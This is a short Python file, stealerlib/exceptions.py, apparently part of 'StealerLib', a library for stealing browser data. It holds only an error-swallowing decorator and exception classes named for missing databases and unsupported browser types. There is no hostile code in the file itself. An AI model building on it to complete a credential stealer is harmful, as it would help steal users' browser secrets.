#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/exceptions.py
"""

from typing import Callable

debug = True


def catch(func: Callable) -> Callable:
    """A function decorator that catches and handles any exceptions thrown

    Parameters:
        func (function): The function to decorate and handle the exceptions of

    Returns:
        function: The decorated function

    Example:
        @catch
        def handled_function():
            # Function code here, exceptions will be handled
    """

    def handle(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception as error:
            if debug:
                print("[!] StealerLib handled an unexpected error: {}".format(error))

    return handle


class NoDatabaseFoundError(Exception):
    def __init__(self, message):
        self.message = message

class InvalidOperatingSystemCall(Exception):
    def __init__(self, message):
        self.message = message

class InvalidBrowserType(Exception):
    def __init__(self, message):
        self.message = message
